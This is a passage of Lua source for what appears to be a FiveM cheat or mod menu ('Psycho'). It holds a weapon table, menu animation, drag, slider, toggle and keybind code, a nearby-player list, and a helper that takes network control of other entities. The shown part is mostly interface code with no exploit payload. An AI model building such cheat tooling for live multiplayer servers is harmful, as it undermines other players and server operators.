    { name = "Widowmaker",               hash = "weapon_raypistol" },

    { name = "Plasma Rifle",             hash = "weapon_plasmacarbine" },

    { name = "Railgun",                  hash = "weapon_railgun" },

    { name = "Homing Launcher",          hash = "weapon_hominglauncher" },

    { name = "Compact EMP Launcher",     hash = "weapon_compactemp" },

    { name = "Drone Station",            hash = "weapon_drone" },

    { name = "Pipe Bomb",                hash = "weapon_pipebomb" },

    { name = "Proximity Mine",           hash = "weapon_proxmine" },

    { name = "Snowball",                 hash = "weapon_snowball" },

    { name = "Petrol Can",               hash = "weapon_petrolcan" },

    { name = "Ball",                     hash = "weapon_ball" },

    { name = "Firework Launcher",        hash = "weapon_firework" },

    { name = "Firework",                 hash = "weapon_snowball" },

    { name = "Parachute",                hash = "gadget_parachute" },

    { name = "Fire Extinguisher",        hash = "weapon_fireextinguisher" },

    { name = "Jerry Can",                hash = "weapon_jerry_can" },

    { name = "Smoke Grenade",            hash = "weapon_smokegrenade" },

    { name = "BZ Gas",                   hash = "weapon_bzgas" },

    { name = "Flare",                    hash = "weapon_flare" },

    { name = "Molotov",                  hash = "weapon_molotov" },

    { name = "Gas Canister",             hash = "weapon_gascan" },

    { name = "Digital Scanner",          hash = "weapon_digitalscanner" },

    { name = "Vulkan Minigun",           hash = "weapon_vulkanminigun" },

    { name = "Compact Vulcan",           hash = "weapon_compactvulcan" },

    { name = "Bike Chain",               hash = "weapon_bikechain" },

    { name = "Buggy Weapon",             hash = "weapon_buggyweapon" },

    { name = "Ceramic Pistol",           hash = "weapon_ceramicpistol" },

    { name = "Ferrite Cannon",           hash = "weapon_ferritecannon" },

    { name = "Homing Rocket Launcher",   hash = "weapon_hominglauncher" },

    { name = "Metal Detector",           hash = "weapon_metaldetector" },

    { name = "Pistol .50",               hash = "weapon_pistol50" },

    { name = "Rapid Fire SMG",           hash = "weapon_rapidfire_smg" },

    { name = "Riot Shotgun",             hash = "weapon_riotshotgun" },

    { name = "Skull Shotgun",            hash = "weapon_skullshotgun" },

    { name = "Smart Rifle",              hash = "weapon_smartrifle" },

    { name = "Sticky Mines",             hash = "weapon_stickymine" },

    { name = "Tactical Pistol",          hash = "weapon_tacticalpistol" },

    { name = "Tactical Shotgun",         hash = "weapon_tacticalshotgun" },

    { name = "Taser",                    hash = "weapon_taser" },

    { name = "Triple-Barrel Shotgun",    hash = "weapon_triplebarrelshotgun" },

    { name = "Vaporizer",                hash = "weapon_vaporizer" },

    { name = "Volley Shotgun",           hash = "weapon_volleyshotgun" },

    { name = "Widowmaker",               hash = "weapon_widowmaker" },

    { name = "Widowmaker MK2",           hash = "weapon_widowmaker_mk2" },

    { name = "Widowmaker MK3",           hash = "weapon_widowmaker_mk3" },

    { name = "Widowmaker MK4",           hash = "weapon_widowmaker_mk4" },

    { name = "Widowmaker MK5",           hash = "weapon_widowmaker_mk5" },

    { name = "Widowmaker MK6",           hash = "weapon_widowmaker_mk6" },

    { name = "Widowmaker MK7",           hash = "weapon_widowmaker_mk7" },

    { name = "Widowmaker MK8",           hash = "weapon_widowmaker_mk8" },

    { name = "Widowmaker MK9",           hash = "weapon_widowmaker_mk9" },

    { name = "Widowmaker MK10",          hash = "weapon_widowmaker_mk10" },

}

--mainfunctions

local R9g3b0tK3i = { ["Label"] = "E", ["Value"] = 38 }

boxheighttarget = 0.6

boxpos2 = 0.565

boxpostarget2 = 0.565

menuwidth = 0

boxwidth = 0

boxheight = 0

boxwidth2 = 0

boxheight2 = 0

local groupcity = nil

local cityAC = nil

local pularwlfusion = nil

mainfunctions =

{

    displayInterface = function()
        anim.fadeIn()

        mainfunctions.disableActions()



        menuwidth = anim.Lerp(menuwidth, 0.45, 0.12)

        if not overlay.anim.boxanim.first then
            if menuwidth > 0.43 then
                boxwidth = anim.Lerp(boxwidth, 0.424, 0.06)

                boxheight = anim.Lerp(boxheight, boxheighttarget, 0.06)

                if boxwidth > 0.41 then
                    boxwidth2 = anim.Lerp(boxwidth2, 0.424, 0.06)

                    boxheight2 = anim.Lerp(boxheight2, boxheighttarget, 0.06)

                    local x, y = mousefunctions.getCursorPosition()

                    overlay.cursorpos.x = anim.Lerp(overlay.cursorpos.x, x, 0.06)

                    overlay.cursorpos.y = anim.Lerp(overlay.cursorpos.y, y, 0.06)

                    if boxheight2 > 0.589 then
                        overlay.anim.boxanim.first = true
                    end
                end
            end
        else
            boxwidth = menuwidth

            boxwidth2 = menuwidth
        end



        DrawSprite("main-interface", "main-interface", 0.5 + Drag.LoaderX, 0.5 + Drag.LoaderY, menuwidth, 0.6, 0, 255,
            255, 255, math.ceil(overlay.opacitys.main))

        DrawSprite("menu-box", "menu-box", 0.44 + Drag.LoaderX, 0.555 + Drag.LoaderY, boxwidth, boxheight, 0, 220, 220,
            220, math.ceil(overlay.opacitys.main))

        if overlay.anim.boxanim.first then
            if psychovars.main.tab ~= "players" and psychovars.main.tab ~= "vehicles" and psychovars.main.tab ~= "weapon" and psychovars.main.tab ~= "vehicle" then
                boxheighttarget = 0.6

                boxpostarget2 = 0.555
            else
                boxheighttarget = 0.33

                boxpostarget2 = 0.457
            end

            boxheight2 = anim.Lerp(boxheight2, boxheighttarget - 0.001, 0.06)
        end

        boxpos2 = anim.Lerp(boxpos2, boxpostarget2, 0.06)



        DrawSprite("menu-box", "menu-box", 0.63 + Drag.LoaderX, boxpos2 + Drag.LoaderY, boxwidth2, boxheight2, 0, 220,
            220, 220, math.ceil(overlay.opacitys.main))

        if boxwidth2 > 0.54 or overlay.anim.boxanim.first then
            anim.menutab()

            if overlay.opacitys.main > 230 then
                DrawSprite("tab-anim", "tab-anim", overlay.anim.tabpos.x + Drag.LoaderX,
                    overlay.anim.tabpos.y + Drag.LoaderY, 0.43, 0.5, 0, 28, 92, 255, math.ceil(overlay.opacitys.main))
            end
        end
    end,



    onReady = function()

    end,



    drawcursor = function()
        --if overlay.anim.boxanim.first then

        overlay.cursorpos.x, overlay.cursorpos.y = mousefunctions.getCursorPosition()

        --end rgb(28, 92, 255)

        texts.drawTextColor("•", overlay.cursorpos.x - 0.004, overlay.cursorpos.y - 0.025, false, false, 0.905, 6, 28,
            92, 255, math.ceil(overlay.opacitys.main))
    end,



    disableActions = function()
        if not overlay.outhers.disabling then
            DisableControlAction(0, 0, true)

            DisableControlAction(0, 1, true)

            DisableControlAction(0, 2, true)

            DisableControlAction(0, 142, true)

            DisableControlAction(0, 140, true)

            DisableControlAction(0, 322, true)

            DisableControlAction(0, 106, true)

            DisableControlAction(0, 25, true)

            DisableControlAction(0, 24, true)

            DisableControlAction(0, 257, true)

            DisableControlAction(0, 23, true)

            DisableControlAction(0, 16, true)

            DisableControlAction(0, 17, true)
        end
    end,



    PsychoDrag = function()
        local useanim = false

        useanim = true

        local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY

        local CursorPositionX, CursorPositionY = mousefunctions.getCursorPosition()

        local animation_start_time = 0

        local animation_duration = 2000

        local current_time = GetGameTimer()

        local elapsed_time = current_time - animation_start_time

        if mousefunctions.CursorZone(0.5 + Loader_X, 0.22 + Loader_Y, 0.45, 0.04) and IsDisabledControlJustPressed(0, 24) then
            xxx = Drag.LoaderX - CursorPositionX

            yyy = Drag.LoaderY - CursorPositionY

            Dragging = true
        elseif IsDisabledControlReleased(0, 24) then
            Dragging = false
        end

        if Dragging then
            if useanim then
                local progress = elapsed_time / animation_duration

                dragantigo = { x = Drag.LoaderX, y = Drag.LoaderY }

                Drag.LoaderX = anim.Lerp(Drag.LoaderX, (CursorPositionX + xxx), 0.08)

                Drag.LoaderY = anim.Lerp(Drag.LoaderY, (CursorPositionY + yyy), 0.08)
            else
                Drag.LoaderX = CursorPositionX + xxx

                Drag.LoaderY = CursorPositionY + yyy
            end
        end
    end

}



mainfunctions.onReady()



--mousefunctions

mousefunctions =

{



    mouse = function(x, y, w, h)
        local X, Y = mousefunctions.getCursorPosition()

        local a, b = w / 2, h / 2

        if (X >= x - a and X <= x + a and Y >= y - b and Y <= y + b) then
            return true
        end
    end,



    CursorZone = function(x, y, w, h)
        h = h * 1.8

        local X, Y = mousefunctions.getCursorPosition()

        local a, b = w / 2, h / 2

        if (X >= x - a and X <= x + a and Y >= y - b and Y <= y + b) then return true end
    end,



    getCursorPosition = function()
        local mousex, mousey = GetNuiCursorPosition()

        local wmouse, hmouse = GetActiveScreenResolution()

        mousex = mousex / wmouse

        mousey = mousey / hmouse

        return mousex, mousey
    end,

}



--texts func

texts =

{

    drawTextColor = function(text, x, y, outline, centre, size, font, rgb1, rgb2, rgb3, opacity)
        SetTextFont(font)

        if outline then
            SetTextOutline(true)
        end

        if tonumber(font) ~= nil then
            SetTextFont(font)
        end

        if centre then
            SetTextCentre(true)
        end

        SetTextColour(rgb1, rgb2, rgb3, opacity)

        SetTextScale(100.0, size or 0.23)

        BeginTextCommandDisplayText("STRING")

        AddTextComponentSubstringWebsite(text)

        EndTextCommandDisplayText(x, y)
    end

}





--animfunctions

anim =

{

    Lerp = function(a, b, t)
        return a + (b - a) * t
    end,



    Lerp_two = function(a, b, t)
        if a < b then
            return a + t
        elseif a > b then
            return a - t
        else
            return a
        end
    end,



    fadeIn = function()
        if not overlay.outhers.disabling then
            overlay.opacitys.main = anim.Lerp(overlay.opacitys.main, 245, 0.090)

            overlay.opacitys.contents = anim.Lerp(overlay.opacitys.contents, 255, 0.090)
        end
    end,



    fadeOut = function()
        menuwidth = anim.Lerp(menuwidth, 0, 0.09)

        boxwidth = anim.Lerp(boxwidth, 0, 0.09)

        boxwidth2 = anim.Lerp(boxwidth2, 0, 0.09)

        if boxwidth < 0.1 then
            boxwidth = 0

            boxwidth2 = 0
        end

        overlay.opacitys.main = anim.Lerp(overlay.opacitys.main, 0, 0.1)

        overlay.opacitys.contents = anim.Lerp(overlay.opacitys.contents, 0, 0.1)

        if overlay.opacitys.main <= 5 and overlay.opacitys.contents <= 5 then
            overlay.outhers.disabling = false

            psychovars.main.drawing = not psychovars.main.drawing
        end
    end,



    menutab = function()
        overlay.anim.tabpos.x = anim.Lerp(overlay.anim.tabpos.x, overlay.anim.tabpos.xdestin, 0.070)

        overlay.anim.tabpos.y = anim.Lerp(overlay.anim.tabpos.y, overlay.anim.tabpos.ydestin, 0.070)
    end

}



--button&more

interact = {}

interact.buttons = {}

interact.textBoxes = {}



function interact.listBox(table, title, posX, posY, dragID)
    if not Drag[dragID] then
        Drag[dragID] = { LoaderX = 0.0, LoaderY = 0.0, Dragging = false }
    end



    local Loader_X, Loader_Y = Drag[dragID].LoaderX, Drag[dragID].LoaderY

    local CursorPositionX, CursorPositionY = mousefunctions.getCursorPosition()

    if mousefunctions.CursorZone(posX + Loader_X, posY + Loader_Y, 0.115, 0.035) and IsDisabledControlJustPressed(0, 24) then
        xx = Drag[dragID].LoaderX - CursorPositionX

        yy = Drag[dragID].LoaderY - CursorPositionY

        Drag[dragID].Dragging = true
    elseif IsDisabledControlReleased(0, 24) then
        Drag[dragID].Dragging = false
    end

    if Drag[dragID].Dragging then
        Drag[dragID].LoaderX = CursorPositionX + xx

        Drag[dragID].LoaderY = CursorPositionY + yy
    end



    if Drag[dragID] then
        local xPos, yPos = posX + Drag[dragID].LoaderX, posY + Drag[dragID].LoaderY

        DrawSprite("ListAdm", "ListAdm", xPos, yPos, 0.13, 0.035, 0, 19, 19, 19, 255)

        texts.drawTextColor(title, xPos - 0.06, yPos - 0.014, false, false, 0.26, 11, 255, 255, 255, 255)



        local yPosition = yPos

        local yAdd = 0.035

        for i, text in ipairs(table) do
            yPosition = yPosition + yAdd

            DrawRect(xPos, yPosition, 0.13, 0.035, 12, 12, 12, 100)

            texts.drawTextColor(text, xPos - 0.06, yPosition - 0.014, false, false, 0.26, 11, 240, 240, 240, 240)
        end
    end
end

function interact.textBox(id, textDef, textBack, x, y)
    local x, y = x + Drag.LoaderX, y + Drag.LoaderY



    if not interact.textBoxes[id] then
        interact.textBoxes[id] = { active = false, text = textDef, }
    end



    if interact.textBoxes[id].text == "" or interact.textBoxes[id].text == nil then
        texts.drawTextColor(textBack, x - 0.05, y - 0.01, false, false, 0.28, 11, 60, 60, 60,
            math.ceil(overlay.opacitys.contents))
    elseif interact.textBoxes[id].active then
        texts.drawTextColor(interact.textBoxes[id].text .. "_", x - 0.05, y - 0.01, false, false, 0.28, 11, 60, 60, 60,
            math.ceil(overlay.opacitys.contents))
    else
        texts.drawTextColor(interact.textBoxes[id].text, x - 0.05, y - 0.01, false, false, 0.28, 11, 60, 60, 60,
            math.ceil(overlay.opacitys.contents))
    end



    if mousefunctions.CursorZone(x, y, 0.14, 0.026) then
        DrawSprite("psycho-button", "psycho-button", x + 0.015, y, 0.6, 0.65, 0, 17, 17, 17,
            math.ceil(overlay.opacitys.contents))

        if IsDisabledControlJustPressed(0, 24) then
            interact.textBoxes[id].active = true
        end
    else
        DrawSprite("psycho-button", "psycho-button", x + 0.015, y, 0.6, 0.65, 0, 16, 16, 16,
            math.ceil(overlay.opacitys.contents))
    end



    if interact.textBoxes[id].active then
        local keyDisables =

        {

            245,

            9,

            29,

            73,

            199,

            0,

            26,

            32,

            45,

            303,

            246,

            38,

            8,

            22

        }

        DisableAllControlActions(10)

        for i, keyIndex in ipairs(keyDisables) do
            for i = 0, 10 do
                DisableControlAction(i, keyIndex, true)
            end
        end



        DrawSprite("psycho-button", "psycho-button", x + 0.015, y, 0.6, 0.65, 0, 18, 18, 18,
            math.ceil(overlay.opacitys.contents))





        if #interact.textBoxes[id].text < 21 then
            for txtKey, k in pairs(Keys) do
                if IsDisabledControlJustPressed(0, k) then
                    if (IsDisabledControlPressed(0, 21)) then
                        interact.textBoxes[id].text = interact.textBoxes[id].text ..

                            string.upper(txtKey)
                    else
                        interact.textBoxes[id].text = interact.textBoxes[id].text .. txtKey
                    end
                end
            end
        end



        -- confirm

        if IsDisabledControlJustPressed(0, 191) then
            interact.textBoxes[id].active = false
        end



        -- subText

        if IsDisabledControlJustPressed(0, 177) then
            local newText = ""



            for i = 1, #interact.textBoxes[id].text - 1 do
                newText = newText .. string.sub(interact.textBoxes[id].text, i, i)
            end



            interact.textBoxes[id].text = newText
        end



        -- cancel

        if IsDisabledControlJustPressed(0, 322) then
            interact.textBoxes[id].active = false
        end
    end



    if not interact.textBoxes[id].active then
        DrawRect(x - 0.055, y, 0.0005, 0.01, 30, 30, 30, math.ceil(overlay.opacitys.contents))
    else
        DrawRect(x - 0.055, y, 0.0005, 0.01, overlay.colors.main.r, overlay.colors.main.g, overlay.colors.main.b,
            math.ceil(overlay.opacitys.contents))
    end
end

function interact.invisiblebutton(x, y, w, h)
    local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY

    local x, y = x + Loader_X, y + Loader_Y

    if mousefunctions.CursorZone(x, y, w, h) then
        if IsDisabledControlJustPressed(0, 24) then
            return true
        end
    end
end

function interact.Slider(slidername, x, y, precisao, size)
    local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY
    local posX, posY = x + Loader_X, y + Loader_Y
    local useanim = false

    if not Sliders[slidername] or Sliders[slidername].value == nil or Sliders[slidername].max == nil or Sliders[slidername].min == nil then
        print("Slider não inicializado de forma correta!")
        return
    end


    local larguraFundoSlider = size
    local alturaSlider = 0.008

    DrawRect(posX, posY, larguraFundoSlider, alturaSlider, 35, 35, 35, math.ceil(overlay.opacitys.contents))


    local proporcaoSlider = (Sliders[slidername].value - Sliders[slidername].min) /
        (Sliders[slidername].max - Sliders[slidername].min)
    local larguraTotalPreenchimento = proporcaoSlider * larguraFundoSlider
    local posicaoPreenchimentoX = posX - (larguraFundoSlider / 2)
    local posicaoIndicadorX = posX - (larguraFundoSlider / 2)

    if Sliders[slidername].value > Sliders[slidername].min then
        posicaoPreenchimentoX = posX - (larguraFundoSlider / 2) + (larguraTotalPreenchimento / 2)
        posicaoIndicadorX = posX - (larguraFundoSlider / 2) + larguraTotalPreenchimento
    end

    DrawRect(posicaoPreenchimentoX, posY, larguraTotalPreenchimento, alturaSlider, overlay.colors.main.r,
        overlay.colors.main.g, overlay.colors.main.b, math.ceil(overlay.opacitys.contents))


    local ajusteIndicador = 0.005
    local indicadorY = posY - 0.0605
    local cursorX, cursorY = mousefunctions.getCursorPosition()


    local inicioSliderX = posX - (larguraFundoSlider / 2)


    if mousefunctions.CursorZone(posX, posY, larguraFundoSlider, alturaSlider + 0.0030) and IsDisabledControlPressed(0, 69) then
        DrawSprite("psycho-button", "psycho-button", cursorX + 0.013, posY - 0.017, 0.09, 0.5, 0, 12, 12, 12,
            math.ceil(overlay.opacitys.contents))


        texts.drawTextColor(math.ceil(Sliders[slidername].value), cursorX + 0.013, posY - 0.027, false, true, 0.28, 11,
            255, 255, 255, math.ceil(overlay.opacitys.contents))


        local novoValor = (((cursorX) - inicioSliderX) / larguraFundoSlider) *
            (Sliders[slidername].max - Sliders[slidername].min) + Sliders[slidername].min


        if useanim then
            Sliders[slidername].value = anim.Lerp(Sliders[slidername].value,
                (precisao and tonumber(string.format("%" .. precisao .. "f", novoValor)) or math.floor(novoValor)), 0.040)
        else
            Sliders[slidername].value = precisao and tonumber(string.format("%" .. precisao .. "f", novoValor)) or
                math.floor(novoValor)
        end
    end


    if useanim then
        local novoValor = (((cursorX) - inicioSliderX) / larguraFundoSlider) *
            (Sliders[slidername].max - Sliders[slidername].min) + Sliders[slidername].min
        Sliders[slidername].value = anim.Lerp(Sliders[slidername].value,
            math.max(math.min(Sliders[slidername].value, Sliders[slidername].max), Sliders[slidername].min), 0.040)
    else
        Sliders[slidername].value = math.max(math.min(Sliders[slidername].value, Sliders[slidername].max),
            Sliders[slidername].min)
    end
end

function camDirect()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())

    local pitch = GetGameplayCamRelativePitch()

    local x = -math.sin(heading * math.pi / 180.0)

    local y = math.cos(heading * math.pi / 180.0)

    local z = math.sin(pitch * math.pi / 180.0)

    local len = math.sqrt(x * x + y * y + z * z)

    if len ~= 0 then
        x = x / len

        y = y / len

        z = z / len
    end

    return x, y, z
end

-- Scroll

function interact.Scroll(qtd, id)
    local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY

    local y = 0.385 + scrolls[id].static

    local add = 0.029

    local max = 0.73

    if IsDisabledControlPressed(0, 14) and y > (0.385 - (qtd * add)) and mousefunctions.mouse(0.4248 + Loader_X, 0.480 + Loader_Y, 0.225, 0.52) then
        scrolls[id].static = scrolls[id].static - add
    end

    if IsDisabledControlJustPressed(0, 15) and y ~= 0.385 and mousefunctions.mouse(0.4248 + Loader_X, 0.480 + Loader_Y, 0.225, 0.52) then
        scrolls[id].static = scrolls[id].static + add
    end
end

local previewkey = 999

local actualbind = nil

local rbind, gbind, bbind = overlay.colors.main.r, overlay.colors.main.g, overlay.colors.main.b

function interact.standardbutton(text, x, y, func)
    local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY
    x, y = x + Loader_X, y + Loader_Y

    DrawSprite("psycho-button", "psycho-button", x + 0.082, y, 0.1, 0.6, 0, 15, 15, 15,
        math.ceil(overlay.opacitys.contents))

    texts.drawTextColor(text, x, y - 0.012, false, true, 0.27, 11, 255, 255, 255, math.ceil(overlay.opacitys.contents))

    if mousefunctions.CursorZone(x, y, 0.14, 0.026) then
        DrawSprite("psycho-button", "psycho-button", x, y, 0.53, 0.65, 0, 17, 17, 17,
            math.ceil(overlay.opacitys.contents))

        if IsDisabledControlJustPressed(0, 24) then
            func()

            return true
        end
    else
        DrawSprite("psycho-button", "psycho-button", x, y, 0.53, 0.65, 0, 15, 15, 15,
            math.ceil(overlay.opacitys.contents))
    end



    if mousefunctions.CursorZone(x + 0.082, y, 0.035, 0.03) then
        actualbind = text

        if interact.binding ~= text then
            if actualbind == text then
                DrawSprite("keyboard", "keyboard", x + 0.082, y, 0.23, 0.3, 0, 80, 80, 80,
                    math.ceil(overlay.opacitys.contents))
            end
        end



        if IsDisabledControlJustPressed(0, 24) then
            if not binds.buttons[text] then
                binds.buttons[text] = { text = "...", bool = true, value = 999, func = func, textopacity = 0 }
            end



            binds.buttons[text].textopacity = 0

            binds.buttons[text].func = func

            previewkey = 999

            interact.binding = text

            binds.buttons[text].bool = true
        end
    else
        if actualbind == text then
            rbind, gbind, bbind = overlay.colors.main.r, overlay.colors.main.g, overlay.colors.main.b
        end

        if interact.binding ~= text then
            DrawSprite("keyboard", "keyboard", x + 0.082, y, 0.23, 0.3, 0, overlay.colors.main.r, overlay.colors.main.g,
                overlay.colors.main.b, math.ceil(overlay.opacitys.contents))
        end
    end





    -- bind system

    if interact.binding == text then
        if binds.buttons[text] then
            if binds.buttons[text].bool then
                DisableAllControlActions()

                binds.buttons[text].textopacity = anim.Lerp(binds.buttons[text].textopacity, 255, 0.020)

                texts.drawTextColor(binds.buttons[text].text, x + 0.1, y - 0.012, false, true, 0.32, 6, 255, 255, 255,
                    math.ceil(binds.buttons[text].textopacity))



                --write key

                local textFunc = text

                for text, key in pairs(Keys) do
                    if IsDisabledControlJustPressed(0, key) then
                        binds.buttons[textFunc].text = string.upper(text)

                        previewkey = key
                    end
                end



                --sucess binded

                if IsDisabledControlJustPressed(0, 191) then
                    binds.buttons[text].value = previewkey

                    binds.buttons[text].bool = false

                    interact.binding = false
                end



                if IsDisabledControlJustPressed(0, 322) or IsDisabledControlJustPressed(0, 177) then
                    interact.binding = false

                    binds.buttons[text].value = 999

                    binds.buttons[text].text = "..."

                    binds.buttons[text].bool = false
                end
            end
        end
    end
end

local Invoken = Citizen.InvokeNative

local props_IDHSOGLFDSKGDUHIOSSD = {

    "prop_bumper_01",

    "prop_bumper_02",

    "prop_bumper_03",

    "prop_bumper_04",

    "prop_bumper_05",

    "prop_bumper_06",

}



local function RequestControlOnce(entity)
    if not NetworkIsInSession() or NetworkHasControlOfEntity(entity) then
        return true
    end

    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)

    return NetworkRequestControlOfEntity(entity)
end



function interact.PlayerButton(text, x, y, outline, r, g, b)
    local cursor_x, cursor_y = GetNuiCursorPosition()

    local widht, height = GetActiveScreenResolution()

    cursor_x = cursor_x / widht

    cursor_y = cursor_y / height

    local text = text

    if

        ((cursor_x) + 0.08 >= x + to_add_X and (cursor_x) - 0.1 <= x + to_add_X and (cursor_y) >= y + to_add_Y and

            (cursor_y) - 0.02 <= y + to_add_Y)

    then
        texts.drawTextColor(text, x + to_add_X - 0.074, y + to_add_Y - 0.005, outline, false, 0.3, 11, r, g, b,
            math.ceil(overlay.opacitys.contents))
    else
        texts.drawTextColor(text, x + to_add_X - 0.074, y + to_add_Y - 0.005, outline, false, 0.3, 11, r, g, b,
            math.ceil(overlay.opacitys.contents))
    end

    if

        ((cursor_x) + 0.08 >= x + to_add_X and (cursor_x) - 0.1 <= x + to_add_X and (cursor_y) >= y + to_add_Y and

            (cursor_y) - 0.02 <= y + to_add_Y and

            IsDisabledControlJustReleased(0, 92))

    then
        return true
    else
        return false
    end
end

local function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)

    local retx = math.rad(rotation.x)

    local absx = math.abs(math.cos(retx))

    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end











local currenttoggle = nil

local togglex = 0.061

local toggley = 0.046

local animvelocity = 0.050



function interact.togglebox(bool, text, x, y, func)
    local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY

    local x, y = x + Loader_X, y + Loader_Y





    DrawSprite("toggle-set", "toggle-set", x + 0.075, y, 1.0, 1.0, 0, 20, 20, 20, math.ceil(overlay.opacitys.contents))



    if mousefunctions.CursorZone(x - 0.043, y + 0.01, 0.05, 0.015) or mousefunctions.CursorZone(x + 0.085, y + 0.01, 0.03, 0.02) then
        if IsDisabledControlJustPressed(0, 24) then
            currenttoggle = text

            disableanim = false

            func()

            return true
        end



        if IsDisabledControlJustPressed(0, 25) then
            cx, cy = mousefunctions.getCursorPosition()

            overlay.opacitys.togglebind = 0

            if not binds.toggles[text] then
                binds.toggles[text] = {
                    text = "",
                    bool = true,
                    value = 999,
                    func = func,
                    textopacity = 0,
                    texttoggle =
                        text
                }
            end

            binds.toggles[text].texttoggle = text

            binds.toggles[text].textopacity = 0

            binds.toggles[text].func = func

            previewkey = 999

            binds.toggles[text].bool = true

            binding = true

            currenttoggle = text
        end
    end



    if bool then
        if currenttoggle == text then
            togglex = anim.Lerp(togglex, 0.071, animvelocity)
        end



        if currenttoggle ~= text then
            texts.drawTextColor(text, x - 0.07, y - 0.005, false, false, 0.28, 11, 255, 255, 255,
                math.ceil(overlay.opacitys.contents))

            texts.drawTextColor("•", x + 0.071, y - 0.046, false, false, 1.80, 6, overlay.colors.main.r,
                overlay.colors.main.g, overlay.colors.main.b, math.ceil(overlay.opacitys.contents))
        elseif not disableanim then
            texts.drawTextColor(text, x - 0.07, y - 0.005, false, false, 0.28, 11, 255, 255, 255,
                math.ceil(overlay.opacitys.contents))

            texts.drawTextColor("•", x + togglex, y - toggley, false, false, 1.80, 6, overlay.colors.main.r,
                overlay.colors.main.g, overlay.colors.main.b, math.ceil(overlay.opacitys.contents))
        else
            texts.drawTextColor(text, x - 0.07, y - 0.005, false, false, 0.28, 11, 255, 255, 255,
                math.ceil(overlay.opacitys.contents))

            texts.drawTextColor("•", x + 0.071, y - 0.046, false, false, 1.80, 6, overlay.colors.main.r,
                overlay.colors.main.g, overlay.colors.main.b, math.ceil(overlay.opacitys.contents))
        end
    else
        if currenttoggle == text then
            togglex = anim.Lerp(togglex, 0.061, animvelocity)
        end



        if currenttoggle ~= text then
            texts.drawTextColor(text, x - 0.07, y - 0.005, false, false, 0.28, 11, 200, 200, 200,
                math.ceil(overlay.opacitys.contents))

            texts.drawTextColor("•", x + 0.061, y - 0.046, false, false, 1.80, 6, 100, 100, 100,
                math.ceil(overlay.opacitys.contents))
        elseif not disableanim then
            texts.drawTextColor(text, x - 0.07, y - 0.005, false, false, 0.28, 11, 200, 200, 200,
                math.ceil(overlay.opacitys.contents))

            texts.drawTextColor("•", x + togglex, y - 0.046, false, false, 1.80, 6, 100, 100, 100,
                math.ceil(overlay.opacitys.contents))
        else
            texts.drawTextColor(text, x - 0.07, y - 0.005, false, false, 0.28, 11, 200, 200, 200,
                math.ceil(overlay.opacitys.contents))

            texts.drawTextColor("•", x + 0.061, y - 0.046, false, false, 1.80, 6, 100, 100, 100,
                math.ceil(overlay.opacitys.contents))
        end
    end



    if binding then
        if currenttoggle == text and binds.toggles[text] then
            if binds.toggles[text].bool then
                DisableAllControlActions()



                overlay.opacitys.togglebind = anim.Lerp(overlay.opacitys.togglebind, 255, 0.020)



                --write key

                local textFunc = text

                for text, key in pairs(Keys) do
                    if IsDisabledControlJustPressed(0, key) then
                        binds.toggles[textFunc].text = string.upper(text)

                        previewkey = key
                    end
                end



                --sucess binded

                if IsDisabledControlJustPressed(0, 191) then
                    binds.toggles[text].value = previewkey

                    binds.toggles[text].bool = false

                    interact.binding = false
                end





                if overlay.opacitys.main > 240 then
                    DrawSprite("psycho-button", "psycho-button", cx + 0.082, cy + 0.022, 0.15, 0.7, 0, 15, 15, 15,
                        math.ceil(overlay.opacitys.togglebind))



                    if binds.toggles[text].text == "" then
                        DrawSprite("keyboard", "keyboard", cx + 0.082, cy + 0.022, 0.3, 0.37, 0, overlay.colors.main.r,
                            overlay.colors.main.g, overlay.colors.main.b, math.ceil(overlay.opacitys.togglebind))
                    else
                        texts.drawTextColor(binds.toggles[text].text, cx + 0.082, cy + 0.01, false, true, 0.27, 11, 255,
                            255, 255, math.ceil(overlay.opacitys.togglebind))
                    end
                end





                if IsDisabledControlJustPressed(0, 322) then
                    binds.toggles[text].bool = false

                    binding = false

                    binds.toggles[text].value = 999

                    binds.toggles[text].text = ""
                end
            end
        end
    end
end

--callback

local playerson = {}

local vehlist = {}

callfunc =

{

    searchOptions = function()

    end,



    updatePlayerList = function()
        Citizen.CreateThread(function()
            while true do
                if psychovars.main.tab == "players" then
                    local activePlayers = GetActivePlayers()

                    local playercoords = GetEntityCoords(PlayerPedId())

                    playerson = {}



                    for _, player in ipairs(activePlayers) do
                        local playerName = GetPlayerName(player)

                        local targetcoords = GetEntityCoords(GetPlayerPed(player))                  -- Coordenadas do jogador de destino

                        local distance = GetDistanceBetweenCoords(playercoords, targetcoords, true) -- Distância entre o jogador local e o jogador de destino

                        table.insert(playerson, { player = player, distance = distance })
                    end





                    table.sort(playerson, function(a, b)
                        return a.distance < b.distance
                    end)
                end



                --verify current players

                for k, player in pairs(playersselected) do
                    local playerCoords = GetEntityCoords(GetPlayerPed(player))

                    local selfCoords = GetEntityCoords(PlayerPedId())

                    local distance = GetDistanceBetweenCoords(selfCoords, playerCoords, false)

                    if distance > listVariables.distanceLimit then
                        table.remove(playersselected, k)
                    end
                end

                Wait(2000)
            end
        end)
    end,



    callWeaponsList = function()
        local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY

        texts.drawTextColor("Lista de Armas", 0.55 + Loader_X, 0.37 + Loader_Y - 0.03, false, false, 0.32, 11,
            overlay.colors.main.r, overlay.colors.main.g, overlay.colors.main.b, math.ceil(overlay.opacitys.contents))

        local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY

        local dW = psychovars.list.MesosnuW - 0.5

        local dH = psychovars.list.MesosnuH - 0.424

        local y = 0.285 + scrolls['weaponList'].static

        local add = 0.022

        local max = 0.6

        if IsDisabledControlPressed(0, 36) and IsDisabledControlJustPressed(0, 34) then
            weaponsSelected = {}

            for index, weapon in ipairs(weaponList) do
                table.insert(weaponsSelected, weapon.hash)
            end
        end



        if IsDisabledControlPressed(0, 36) and IsDisabledControlJustPressed(0, 177) then
            weaponsSelected = {}
        end





